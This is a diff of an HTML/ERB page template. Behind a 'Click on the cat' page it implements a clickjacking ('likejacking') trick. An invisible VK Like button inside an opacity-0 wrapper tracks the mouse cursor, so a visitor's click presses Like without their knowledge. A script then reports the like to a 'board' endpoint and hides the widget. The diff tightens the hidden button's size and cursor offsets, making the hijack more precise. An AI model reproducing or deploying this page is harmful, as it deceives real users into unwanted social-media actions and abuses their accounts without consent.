@@ -1,64 +1,64 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title></title>
-	<script type="text/javascript" src="http://vk.com/js/api/openapi.js?122"></script>
-	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
+  <title></title>
+  <script type="text/javascript" src="http://vk.com/js/api/openapi.js?122"></script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
 </head>
 <style type="text/css">
-		#overlay {
-			width: 100%;
-			height: 100%;
-			position: absolute;
-			top: 0;
-			left: 0;
-			/*cursor: pointer;*/
-			z-index: 100;
-		}
-		#wrap1 {
-			overflow: hidden;
-			width: 180px;
-			height: 25px;
-			opacity: 0;
-			position: absolute;
-			z-index: 101;
-		}
+    #overlay {
+      width: 100%;
+      height: 100%;
+      position: absolute;
+      top: 0;
+      left: 0;
+      /*cursor: pointer;*/
+      z-index: 100;
+    }
+    #wrap1 {
+      overflow: hidden;
+      width: 50px;
+      height: 25px;
+      opacity: 0;
+      position: absolute;
+      z-index: 101;
+    }
 </style>
 <body>
 
-	<script type="text/javascript">
-	  VK.init({apiId: <%= CONFIG[:vk_api_id] %>, onlyWidgets: true});
-	</script>
+  <script type="text/javascript">
+    VK.init({apiId: <%= CONFIG[:vk_api_id] %>, onlyWidgets: true});
+  </script>
 
-	<center>
-		<h1>Click on the cat</h1>
-		<img src="https://catmacros.files.wordpress.com/2009/07/wow.jpg">
-		<p>This website may collect sensitive information about you.</p>
-		<p>By using the site you consent to the processing and storage of your data</p>
-	</center>
-	<div id="overlay">
-		<div id="wrap1">
-				<div id="vk_like"></div>
-		</div>
-	</div>
+  <center>
+    <h1>Click on the cat</h1>
+    <img src="https://catmacros.files.wordpress.com/2009/07/wow.jpg">
+    <p>This website may collect sensitive information about you.</p>
+    <p>By using the site you consent to the processing and storage of your data</p>
+  </center>
+  <div id="overlay">
+    <div id="wrap1">
+        <div id="vk_like"></div>
+    </div>
+  </div>
 
-	<script type="text/javascript">
-		VK.Widgets.Like("vk_like", {type: "button", page_id: <%= @current_time %>} );
-	</script>
+  <script type="text/javascript">
+    VK.Widgets.Like("vk_like", {type: "button", page_id: <%= @current_time %>} );
+  </script>
 
-	<script type="text/javascript">
-		var el = $('#wrap1');
-		$(window).on('mousemove', function(e) {
-			el.css({left:  e.pageX - 60, top:   e.pageY - 12 });
-		});
+  <script type="text/javascript">
+    var el = $('#wrap1');
+    $(window).on('mousemove', function(e) {
+      el.css({left:  e.pageX - 10, top:   e.pageY - 6 });
+    });
 
-		VK.Observer.subscribe("widgets.like.liked", function f()
-		{
-			$.post( "board", { current_time: <%= @current_time %> } );
-			el.remove();
-			$('iframe#vkwidget1_tt').remove();
-		});
-	</script>
+    VK.Observer.subscribe("widgets.like.liked", function f()
+    {
+      $.post( "board", { current_time: <%= @current_time %> } );
+      el.remove();
+      $('iframe#vkwidget1_tt').remove();
+    });
+  </script>
 
 </body>
 </html>
